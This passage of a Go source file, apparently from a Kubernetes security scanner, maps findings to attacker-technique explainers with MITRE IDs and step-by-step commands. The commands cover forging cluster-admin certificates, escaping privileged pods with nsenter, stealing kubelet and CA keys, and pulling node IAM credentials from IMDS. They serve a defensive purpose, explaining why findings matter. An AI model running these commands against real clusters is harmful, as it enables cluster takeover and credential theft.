		Plain: template.HTML(`<p>The <code>nodes/proxy</code> subresource forwards requests to the kubelet on each node. Combined with kubelet's <code>/exec</code> endpoint and a WebSocket verb mismatch, this becomes a primitive for executing commands inside any pod the kubelet can reach.</p>`),
		Mitre: "T1611 — Escape to Host",
	},
	"csr_approve": {
		Title: "CSR self-approval to system:masters",
		Plain: template.HTML(`<p>The combination of <code>create</code> on <code>certificatesigningrequests</code> AND <code>update</code>/<code>patch</code> on <code>certificatesigningrequests/approval</code> at cluster scope lets the holder mint a kubelet-signed x509 client cert carrying any Subject DN they choose. Setting the Organization to <code>system:masters</code> produces a credential that the apiserver authorizes as cluster-admin regardless of RBAC.</p><p>This is a permanent backdoor primitive: the cert validity is whatever the signer applies (often a year), and revoking the original RBAC grant does not invalidate it — only a CA rotation does. The Kubernetes project lists this in RBAC Good Practices as a privilege-escalation risk on par with direct <code>impersonate</code>.</p>`),
		Mitre: "T1098.001 — Account Manipulation: Additional Cloud Credentials",
		AttackerSteps: []AttackerStep{
			{Note: "Generate a private key and CSR locally with system:masters in the Subject", Cmd: "openssl req -new -newkey rsa:2048 -nodes -keyout admin.key -subj '/CN=attacker/O=system:masters' -out admin.csr"},
			{Note: "Submit the CSR to the kube-apiserver-client signer", Cmd: "kubectl apply -f - <<EOF\napiVersion: certificates.k8s.io/v1\nkind: CertificateSigningRequest\nmetadata: {name: takeover}\nspec:\n  request: $(base64 -w0 admin.csr)\n  signerName: kubernetes.io/kube-apiserver-client\n  usages: [client auth]\nEOF"},
			{Note: "Self-approve the CSR", Cmd: "kubectl certificate approve takeover"},
			{Note: "Extract the signed cert", Cmd: "kubectl get csr takeover -o jsonpath='{.status.certificate}' | base64 -d > admin.crt"},
			{Note: "Use it as cluster-admin", Cmd: "kubectl --client-certificate=admin.crt --client-key=admin.key get secrets -A"},
		},
	},
	"pod_host_escape": {
		Title: "Container escape to host",
		Plain: template.HTML(`<p>The pod is configured in a way that makes escaping to the underlying node trivial: <code>privileged: true</code>, <code>hostPID</code>, <code>hostNetwork</code>, or a sensitive <code>hostPath</code> mount (root, docker.sock, etc.). An attacker who controls the container reaches root on the node, then has access to every pod and kubelet credential on that node.</p>`),
		Mitre: "T1611 — Escape to Host",
		AttackerSteps: []AttackerStep{
			{Note: "From inside the privileged pod, drop into PID 1's namespaces on the host", Cmd: "nsenter -t 1 -m -u -i -n -p -- /bin/sh"},
			{Note: "Steal the kubelet's client cert (the node's identity to the API server)", Cmd: "cat /var/lib/kubelet/pki/kubelet-client-current.pem"},
			{Note: "Pivot to other pods on the same node via the container runtime socket", Cmd: "crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps"},
		},
	},
	"ephemeral_container_inject": {
		Title: "Ephemeral container injection",
		Plain: template.HTML(`<p><code>update</code>/<code>patch</code> on <code>pods/ephemeralcontainers</code> adds an attacker-chosen container to an already-running pod (the mechanism behind <code>kubectl debug</code>). The injected container joins the victim pod's namespaces and can mount its ServiceAccount token, so it is effectively pod creation against an existing victim: the attacker picks the image but inherits the pod's identity and host exposure.</p>`),
		Mitre: "T1610 — Deploy Container",
		AttackerSteps: []AttackerStep{
			{Note: "Inject a debug container into a pod backed by a privileged ServiceAccount", Cmd: "kubectl debug -it <pod> --image=alpine --target=<container>"},
			{Note: "Read the victim pod's mounted token from the injected container", Cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
		},
	},
	"secret_mint_token": {
		Title: "Mint a token via a legacy Secret",
		Plain: template.HTML(`<p>Holding both <code>create</code> and <code>get</code> on <code>secrets</code> lets an attacker create a Secret of type <code>kubernetes.io/service-account-token</code> annotated for a target ServiceAccount. The token controller fills in a valid, non-expiring token, which the attacker reads back. This bypasses the <code>serviceaccounts/token</code> TokenRequest gate entirely and leaves a persistent, secret-backed credential.</p>`),
		Mitre: "T1098.001 — Account Manipulation: Additional Cloud Credentials",
		AttackerSteps: []AttackerStep{
			{Note: "Create a token Secret bound to a privileged ServiceAccount", Cmd: "kubectl apply -f - <<EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: mint\n  annotations: {kubernetes.io/service-account.name: <target-sa>}\ntype: kubernetes.io/service-account-token\nEOF"},
			{Note: "Read the controller-populated token", Cmd: "kubectl get secret mint -o jsonpath='{.data.token}' | base64 -d"},
		},
	},
	"node_drain_migrate": {
		Title: "Migrate pods onto an attacker node",
		Plain: template.HTML(`<p><code>delete pods</code> combined with cluster-scoped node control (<code>update</code>/<code>patch</code> on <code>nodes/status</code>, or <code>delete nodes</code>) lets an attacker cordon or remove every node except one they control, then evict a sensitive pod. The scheduler relocates the pod onto the attacker's node, where its ServiceAccount token and traffic are exposed.</p>`),
		Mitre: "T1610 — Deploy Container",
		AttackerSteps: []AttackerStep{
			{Note: "Cordon every node except the attacker-controlled one", Cmd: "kubectl cordon <other-node>"},
			{Note: "Evict the target pod so it reschedules onto the remaining node", Cmd: "kubectl delete pod <target> -n <ns>"},
		},
	},
	"pod_create_privileged_escape": {
		Title: "Create a privileged pod and escape to the node",
		Plain: template.HTML(`<p>RBAC never inspects pod contents, only the <code>create</code> verb. When the target namespace has no restrictive Pod Security Admission <code>enforce</code> label, an attacker who can create pods sets <code>privileged: true</code>, <code>hostPID</code>, or a <code>hostPath</code> mount of <code>/</code> and breaks out to the node. Baseline or Restricted enforcement would block this and limit the risk to token theft alone.</p>`),
		Mitre: "T1611 — Escape to Host",
		AttackerSteps: []AttackerStep{
			{Note: "Create a privileged pod that mounts the host and shares host PID", Cmd: "kubectl run pwn --image=alpine --privileged --overrides='{\"spec\":{\"hostPID\":true}}' --command -- sleep infinity"},
			{Note: "Escape to the node from the privileged pod", Cmd: "kubectl exec -it pwn -- nsenter -t 1 -m -u -i -n -p -- /bin/sh"},
		},
	},
	"port_forward": {
		Title: "Port-forward to internal services",
		Plain: template.HTML(`<p><code>create</code> on <code>pods/portforward</code> opens a tunnel from the attacker's machine, through the API server and kubelet, to any TCP port on a target pod. It bypasses NetworkPolicy and Service controls because the traffic rides the kubelet streaming channel, so internal-only services (databases, admin consoles, sidecar APIs) become directly reachable.</p>`),
		Mitre: "T1090 — Proxy",
		AttackerSteps: []AttackerStep{
			{Note: "Tunnel to an internal database port on a target pod", Cmd: "kubectl port-forward pod/<target> 5432:5432"},
			{Note: "Connect to the now-local service with no NetworkPolicy in the path", Cmd: "psql -h localhost -p 5432"},
		},
	},
	// Cloud-provider (EKS) techniques. The keys mirror the Action strings on the
	// privesc edges that Unit 4 wires into the graph, so a chain hop with
	// Action="irsa_assume_role" looks its explainer up here directly.
	"irsa_assume_role": {
		Title: "Assume AWS IAM Role via IRSA",
		Plain: template.HTML(`<p>A pod whose ServiceAccount is annotated with <code>eks.amazonaws.com/role-arn</code> can call <code>sts:AssumeRoleWithWebIdentity</code> with the projected SA token and receive short-lived AWS credentials for the named IAM role. The exchange happens entirely in user-space inside the pod, so anyone with exec on that pod (or with create-pod rights in the namespace) inherits the IAM role's permissions.</p><p>What the attacker gains depends on the IAM role's policy. If the role carries <code>AdministratorAccess</code>, <code>PowerUserAccess</code>, or any <code>*:*</code> grant, this is an AWS-account-wide takeover routed through Kubernetes.</p>`),
		Mitre: "T1078.004 — Valid Accounts: Cloud Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "Find ServiceAccounts annotated with an IRSA role ARN", Cmd: "kubectl get sa -A -o json | jq -r '.items[] | select(.metadata.annotations.\"eks.amazonaws.com/role-arn\") | .metadata.namespace + \"/\" + .metadata.name + \" -> \" + .metadata.annotations.\"eks.amazonaws.com/role-arn\"'"},
			{Note: "Land a shell on a pod that uses one of those SAs", Cmd: "kubectl exec -it <pod-with-irsa-sa> -- /bin/sh"},
			{Note: "The pod's AWS SDK already exchanges the projected token for STS credentials; confirm the assumed identity", Cmd: "aws sts get-caller-identity"},
			{Note: "Probe what the assumed role can do in AWS", Cmd: "aws iam list-attached-role-policies --role-name <role-from-arn>"},
		},
	},
	"imds_node_role_pivot": {
		Title: "Steal node IAM role via IMDS",
		Plain: template.HTML(`<p>EC2-backed EKS worker nodes attach an IAM role to the instance and expose its credentials at the link-local IMDS endpoint <code>169.254.169.254</code>. Pods inherit the host's network unless a NetworkPolicy denies egress to that IP, so a compromised pod can curl IMDS, parse out the node-role credentials, and act in AWS as the node.</p><p>The node role is typically broader than any single workload's IRSA role: it can pull from ECR, describe EC2 instances, and is often given additional grants for cluster-autoscaler / EBS-CSI / external-dns. This is a credential-theft chain (SSRF to cloud creds) rather than a Kubernetes RBAC chain.</p>`),
		Mitre: "T1552.005 — Unsecured Credentials: Cloud Instance Metadata API",
		AttackerSteps: []AttackerStep{
			{Note: "From inside a pod, fetch the IMDSv2 token then read the role credentials", Cmd: "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
			{Note: "Read the credentials JSON for the node role returned above", Cmd: "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"},
			{Note: "Export the stolen credentials and act as the node role in AWS", Cmd: "export AWS_ACCESS_KEY_ID=...; export AWS_SECRET_ACCESS_KEY=...; export AWS_SESSION_TOKEN=...; aws sts get-caller-identity"},
		},
	},
	"aws_auth_admin": {
		Title: "AWS IAM principal granted cluster-admin via aws-auth",
		Plain: template.HTML(`<p>EKS authenticates AWS IAM principals into Kubernetes via the <code>kube-system/aws-auth</code> ConfigMap. Each entry under <code>mapRoles</code> / <code>mapUsers</code> ties an IAM role or user ARN to a Kubernetes username and a list of groups. If that group list contains <code>system:masters</code>, the IAM principal is hard-coded as cluster-admin by the apiserver. If it contains any group bound to <code>cluster-admin</code> via a ClusterRoleBinding, the effect is the same: the IAM principal can do anything in the cluster.</p><p>This grant is invisible to <code>kubectl get clusterrolebindings</code>: the mapping lives in a ConfigMap and the resulting identity is synthesized at request-time by the EKS aws-iam-authenticator.</p>`),
		Mitre: "T1078 — Valid Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "Confirm the AWS identity you control", Cmd: "aws sts get-caller-identity"},
			{Note: "Refresh the EKS kubeconfig context for the target cluster", Cmd: "aws eks update-kubeconfig --name <cluster> --region <region>"},
			{Note: "Prove cluster-admin reach", Cmd: "kubectl auth can-i --list"},
			{Note: "Read every Secret cluster-wide", Cmd: "kubectl get secrets -A"},
		},
	},
	"colocated_sa_token_theft": {
		Title: "Co-located ServiceAccount token theft",
		Plain: template.HTML(`<p>Administrative control over a namespace implies control over every identity inside it. Someone who can create RoleBindings in a namespace can create a pod that mounts any ServiceAccount there, exec into a pod already running as it, or read its token Secret directly.</p><p>This matters when a namespace hosts an identity more powerful than the namespace itself, for example a controller whose ClusterRoleBinding grants cluster-wide permissions. Namespace-admin then becomes a stepping stone rather than a boundary.</p>`),
		Mitre: "T1528 — Steal Application Access Token",
		AttackerSteps: []AttackerStep{
			{Note: "List the ServiceAccounts available in the compromised namespace", Cmd: "kubectl get serviceaccounts -n <ns>"},
			{Note: "Find which of them hold cluster-wide permissions", Cmd: "kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.namespace==\"<ns>\")'"},
			{Note: "Mint a token for the most powerful one", Cmd: "kubectl create token <sa> -n <ns>"},
		},
	},
	"control_plane_pki_theft": {
		Title: "Control-plane PKI theft",
		Plain: template.HTML(`<p>Root on a node is serious anywhere, but root on a <em>control-plane</em> node is game over. The cluster's certificate authority private key sits at <code>/etc/kubernetes/pki/ca.key</code>. With it an attacker signs a client certificate carrying <code>O=system:masters</code> entirely offline, and the API server accepts it because that group short-circuits authorization.</p><p>No RBAC object changes, so no audit event records the grant. Recovery means rotating the cluster CA, not merely deleting a binding.</p>`),
		Mitre: "T1552.004 — Unsecured Credentials: Private Keys",
		AttackerSteps: []AttackerStep{
			{Note: "Confirm the node you landed on is a control-plane node", Cmd: "ls /etc/kubernetes/pki/ca.key"},
			{Note: "Sign a client certificate as the system:masters group", Cmd: "openssl x509 -req -in attacker.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -out attacker.crt"},
			{Note: "Use the forged certificate against the API server", Cmd: "kubectl --client-certificate attacker.crt --client-key attacker.key get secrets -A"},
		},
	},
	"static_pod_admission_bypass": {
		Title: "Static pod and SA signing-key abuse",
		Plain: template.HTML(`<p>The kubelet on a control-plane node runs any manifest dropped into <code>/etc/kubernetes/manifests</code> as a static pod. Static pods never traverse the API server, so no admission webhook, Pod Security Admission label, or policy engine can see or block them.</p><p>The same node holds <code>/etc/kubernetes/pki/sa.key</code>, the key that signs every ServiceAccount token in the cluster. An attacker with it forges a valid token for any ServiceAccount without touching the API at all.</p>`),
		Mitre: "T1610 — Deploy Container",
		AttackerSteps: []AttackerStep{
			{Note: "Drop a privileged static pod that no admission controller sees", Cmd: "cp attacker-pod.yaml /etc/kubernetes/manifests/"},
			{Note: "Steal the ServiceAccount token signing key", Cmd: "cat /etc/kubernetes/pki/sa.key"},
		},
	},
	"operator_reconcile": {
		Title: "Confused deputy: operator reconciliation",
		Plain: template.HTML(`<p>Operators work by watching custom resources and acting on them with their own, usually cluster-wide, permissions. A tenant who can write one of those custom resources needs no permissions of their own: they write the instruction, and the controller carries it out as itself.</p><p>A GitOps controller pointed at an attacker-controlled repository applies whatever manifests it finds there, including a ClusterRoleBinding. A monitoring operator told to scrape a chosen <code>bearerTokenFile</code> reads and ships its own mounted token. The permission that matters belongs to the deputy, not the requester.</p>`),
		Mitre: "T1078 — Valid Accounts",
		AttackerSteps: []AttackerStep{
			{Note: "Check which operator custom resources you can write", Cmd: "kubectl auth can-i --list | grep -Ei 'fluxcd|argoproj|cert-manager|external-secrets|velero|tekton|monitoring.coreos'"},
			{Note: "Confirm the reconciling controller is more privileged than you are", Cmd: "kubectl auth can-i --list --as=system:serviceaccount:<controller-ns>:<controller-sa>"},
			{Note: "Point the custom resource at an attacker-controlled source and let the controller apply it", Cmd: "kubectl apply -f attacker-kustomization.yaml"},
		},
	},
}

// Categories maps a RiskCategory to plain-language explainer copy used on the impact-lane nodes.
var Categories = map[string]CategoryExplainer{
	string(models.CategoryPrivilegeEscalation): {
		Title: "Privilege Escalation",
		Plain: template.HTML(`<p>An identity that started with limited permissions ends up acting as cluster-admin (or <code>system:masters</code>, or the kubelet on a node). Privilege escalation is the gateway impact: every other category becomes possible once an attacker has it.</p>`),
		Examples: []string{
			"A compromised application pod's ServiceAccount mints a cluster-admin token via TokenRequest.",
			"A namespace-admin abuses bind/escalate to grant themselves cluster-admin.",
			"A privileged DaemonSet's pod is exec'd into and the attacker pivots to the node, then to the kubelet's credentials.",
		},
	},
	string(models.CategoryLateralMovement): {
		Title: "Lateral Reach",
		Plain: template.HTML(`<p>The attacker spreads sideways: across namespaces, across nodes, or out of the pod onto cluster-internal services. NetworkPolicy gaps, default-allow service meshes, and over-broad ServiceAccounts in shared namespaces all enable this.</p>`),
		Examples: []string{
			"From a compromised pod, reach the API server, etcd metrics endpoints, or internal databases that have no NetworkPolicy.",
			"hostNetwork pods can sniff or spoof traffic for every other pod on the same node.",
		},
	},
	string(models.CategoryDataExfiltration): {
		Title: "Data Exfiltration",
		Plain: template.HTML(`<p>Reading data the attacker should not see: Secrets, ConfigMap-stored credentials, application data in PersistentVolumes, or audit logs that reveal internal structure.</p>`),
		Examples: []string{
			"Reading every Secret in kube-system to harvest controller credentials.",
			"Mounting a PersistentVolume from a database StatefulSet.",
			"Pulling registry pull-secrets and using them to clone private images.",
		},
	},
	string(models.CategoryInfrastructureModification): {
		Title: "Control Bypass",
		Plain: template.HTML(`<p>The attacker turns off, weakens, or works around the cluster's policy enforcement: admission webhooks, Pod Security admission, OPA/Gatekeeper, or audit configuration. After this, follow-on actions become invisible to defenders.</p>`),
		Examples: []string{
			"Patching a `ValidatingWebhookConfiguration` to `failurePolicy: Ignore`, then deleting the backing service.",
			"Removing a Pod Security label from a namespace to allow privileged pods.",
		},
	},
	string(models.CategoryDefenseEvasion): {
		Title: "Detection Evasion",
		Plain: template.HTML(`<p>The attacker hides their tracks: disabling audit logging, deleting events, rolling back resource versions, or abusing legitimate-looking patterns (impersonation, service accounts) so the activity blends in.</p>`),
		Examples: []string{
			"Using `--as=system:serviceaccount:kube-system:replicaset-controller` to impersonate a high-volume controller and disappear in audit log noise.",
			"Deleting Events that record the privileged pod's creation.",
		},
	},
}

// TechniqueKeyForFinding picks the right Techniques key for a Finding.
// Preference: the first hop's Action (privesc-PATH findings carry these); otherwise we map by RuleID prefix.
// Returns "" if no entry applies — the JS layer treats that as "no technique explainer".
func TechniqueKeyForFinding(f models.Finding) string {
	if len(f.EscalationPath) > 0 && f.EscalationPath[0].Action != "" {
		if _, ok := Techniques[f.EscalationPath[0].Action]; ok {
			return f.EscalationPath[0].Action
		}
	}
	switch {
	case strings.HasPrefix(f.RuleID, "KUBE-ESCAPE"):
		return "pod_host_escape"
	case strings.HasPrefix(f.RuleID, "KUBE-PV-HOSTPATH-"):
		// Same attacker primitive as direct hostPath, just routed through the PVC layer.
		return "pod_host_escape"
	case strings.HasPrefix(f.RuleID, "KUBE-PSA-LABELS-"):
		// Namespace-level finding: no per-finding technique applies, but the
		// "deploy container" technique covers the regression a missing PSA
		// label enables. Returning "" would drop the explainer card entirely.
		return ""
	case f.RuleID == "KUBE-PRIVESC-001":
		return "pod_create_token_theft"
	case f.RuleID == "KUBE-PRIVESC-002":
		return "pod_create_privileged_escape"
	case f.RuleID == "KUBE-PRIVESC-004":
		return "pod_exec"
	case f.RuleID == "KUBE-PRIVESC-005":
		return "read_secrets"
	case f.RuleID == "KUBE-PRIVESC-006":
		return "read_secrets"
	case f.RuleID == "KUBE-PRIVESC-007":
		return "secret_mint_token"
	case f.RuleID == "KUBE-PRIVESC-013":
		return "ephemeral_container_inject"
	case f.RuleID == "KUBE-PRIVESC-015":
		return "port_forward"
	case f.RuleID == "KUBE-PRIVESC-016":
		return "node_drain_migrate"
	case f.RuleID == "KUBE-PRIVESC-008":
		return "impersonate"
	case f.RuleID == "KUBE-PRIVESC-009":
		return "bind_or_escalate"
	case f.RuleID == "KUBE-PRIVESC-010":
		return "modify_role_binding"
	case f.RuleID == "KUBE-PRIVESC-011":
		return "csr_approve"
	case f.RuleID == "KUBE-PRIVESC-012":
		return "nodes_proxy"
	case f.RuleID == "KUBE-PRIVESC-014":
		return "token_request"
	case f.RuleID == "KUBE-PRIVESC-017":
		return "wildcard_permission"
	case f.RuleID == "KUBE-RBAC-OVERBROAD-001":
		return "bound_to_cluster_admin"
	case f.RuleID == "KUBE-CLOUD-AWSAUTH-SYSTEM-MASTERS-001",
		f.RuleID == "KUBE-CLOUD-AWSAUTH-OVERBROAD-001":
		return "aws_auth_admin"
	case f.RuleID == "KUBE-CLOUD-IRSA-ADMIN-ROLE-001":
		return "irsa_assume_role"
	case f.RuleID == "KUBE-CLOUD-IMDS-PIVOT-001":
		return "imds_node_role_pivot"
	case strings.HasPrefix(f.RuleID, "KUBE-PRIVESC-PATH-"):
		// Fall back to the chain's first hop, already handled above; if no hops, leave empty.
		return ""
	}
	return ""
}

// GlossaryKeyForSubject picks the right Glossary key for a SubjectRef. Returns "" when there's no
// specific entry — the JS uses the entry-node Title in that case.
func GlossaryKeyForSubject(ref *models.SubjectRef) string {
	if ref == nil {
		return ""
	}
	// External cloud-IAM principals show up as Kind="User" with an ARN-shaped
	// Name (set by the cloud analyzer's aws-auth findings and Unit 4's privesc
	// graph external nodes). Route them to IAMRole / IAMUser before the generic
	// User entry so the side panel teaches AWS identity rather than k8s User.
	if cloudKey := cloudIAMKeyForName(ref.Name); cloudKey != "" {
		return cloudKey
	}
	switch ref.Kind {
	case "ServiceAccount", "User", "Group":
		// system:masters has its own dedicated entry; check by name.
		if ref.Kind == "Group" && ref.Name == "system:masters" {
			return "system:masters"
		}
		return ref.Kind
	}
	return ""
}

// GlossaryKeyForResource picks the right Glossary key for a ResourceRef.
func GlossaryKeyForResource(ref *models.ResourceRef) string {
	if ref == nil {
		return ""
	}
	// External cloud-IAM principals can also surface as a Resource on some
	// cloud findings (e.g. the IRSA-mapped role attached to a SA). Map by ARN
	// shape the same way as the subject side.
	if cloudKey := cloudIAMKeyForName(ref.Name); cloudKey != "" {
		return cloudKey
	}
	switch ref.Kind {
	case "Pod", "Deployment", "DaemonSet", "StatefulSet", "ReplicaSet", "Job",
		"Secret", "ConfigMap", "Namespace", "PersistentVolume",
		"ClusterRole", "ClusterRoleBinding", "Role", "RoleBinding":
		return ref.Kind
	}
	return ""
}

// cloudIAMKeyForName returns "IAMRole" / "IAMUser" / "" by sniffing the AWS-style
// identity string the cloud analyzer puts on Subject/Resource Name. Two prefixes
// surface in practice: a literal ARN ("arn:aws:iam::123:role/foo") and the
// synthetic "external:aws-iam:..." form Unit 4 uses for graph nodes. Both carry
// the discriminating substring (":role/" vs ":user/") in the body of the string,
// so we look at that rather than parsing each form.
func cloudIAMKeyForName(name string) string {
	if name == "" {
		return ""
	}
	hasAWS := strings.HasPrefix(name, "arn:aws:iam:") ||
		strings.HasPrefix(name, "external:aws-iam:") ||
		strings.Contains(name, "arn:aws:iam")
	if !hasAWS {
		return ""
	}
	switch {
	case strings.Contains(name, ":role/"):
		return "IAMRole"
	case strings.Contains(name, ":user/"):
		return "IAMUser"
	}
	return ""
}
